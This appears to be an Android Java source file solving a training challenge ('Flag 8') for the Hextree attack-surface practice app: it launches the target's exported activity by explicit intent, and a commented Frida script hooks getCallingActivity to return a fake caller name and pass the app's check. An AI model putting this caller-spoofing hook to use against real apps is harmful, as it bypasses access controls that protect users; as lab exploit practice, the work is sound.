package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag8Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag8, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag8);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity"));
            startActivityForResult(intent, 1337);
        });
        return view;
    }

    // As I didn't want to change my MainActivity name, I used frida.
    /*
    Java.perform(()=>{
        var Activity = Java.use("android.app.Activity");
        Activity.getCallingActivity.implementation = function () {
            var fakeComponent = Java.use("android.content.ComponentName")
                .$new("com.fake.Hextree", "com.fake.Hextree.HextreeActivity");

            console.log("[+] Hooked getCallingActivity(), returning fake ComponentName");
            return fakeComponent;
        };
    })
    */

} 